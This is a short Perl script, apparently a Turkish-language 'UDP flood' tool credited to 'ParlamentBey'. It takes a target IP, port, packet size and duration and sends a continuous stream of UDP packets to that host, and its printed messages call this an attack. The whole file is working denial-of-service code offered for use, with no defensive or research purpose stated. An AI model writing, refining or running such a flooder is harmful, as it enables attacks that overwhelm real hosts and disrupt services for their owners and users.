#!/usr/bin/perl
# -*- coding: utf-8 -*-"

# // Coder By ParlamentBey# // Bu Script ParlamentBey Tarafından Kodlanmıştır.
# // ÇALANA HAKKIM HARAM OLSUN !
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "\e[96m Kullanım : perl ParlamentBey.pl ip port socket time\n";
  print "\e[91m     Coder By ParlamentBey\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Bağlanılamıyor $ip\n";
$endtime = time() + ($time ? $time : 950000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print "~ Saldırıyı iptal etmek için basın \'Ctrl-C\'\n\n";
print "|IP|\t\t |Port|\t\t |Paket|\t\t |Sure|\n";
print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
print "Saldırıyı iptal etmek için basın 'Ctrl-C'\n" unless $time;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(9500000-64)+64) ;
  $pport = $port ? $port : int(rand(95500000))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}